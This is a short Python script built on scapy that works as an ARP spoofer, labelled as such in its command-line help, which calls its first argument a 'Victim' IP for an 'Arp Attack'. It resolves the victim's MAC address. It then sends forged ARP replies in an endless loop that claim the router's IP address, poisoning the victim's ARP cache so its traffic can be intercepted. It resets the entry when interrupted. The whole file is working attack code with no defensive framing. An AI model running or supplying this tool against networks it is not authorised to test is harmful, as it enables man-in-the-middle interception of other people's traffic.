import scapy.all as scapy

import argparse
import subprocess

def get_mac_addr(ip):
    packet =scapy.ARP(pdst=ip)

    ether = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    newpacket = ether/packet
    answer=scapy.srp(newpacket,timeout=3,verbose=0)[0]
    return answer[0][1].src



def arp_spoofer(target_ip,router_ip):
    target_mac =get_mac_addr(target_ip)

    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=router_ip) 
    
    try:
        count = 0
        while True:
            count = count +1 
            scapy.send(packet,verbose=0)
            subprocess.call("clear")
            print(f"Sending {count} Packet")
            

    except KeyboardInterrupt:
        restore_arp(target_ip,router_ip)
        print("Arp Spoofer Is Closing Now ")
        

def restore_arp(target_ip,router_ip):
    target_mac = get_mac_addr(target_ip)
    router_mac = get_mac_addr(router_ip)
    packet = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=router_ip,hwsrc=router_mac) 
    scapy.send(packet,verbose=0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Arp Spoofer")
    parser.add_argument("target",help="Input A Victim Ip Adress To Perform Arp Attack")
    parser.add_argument("host",help="Input A router Ip Adress To Perform Arp Attack")
    args = parser.parse_args()
    target = args.target
    host = args.host
    arp_spoofer(target,host)



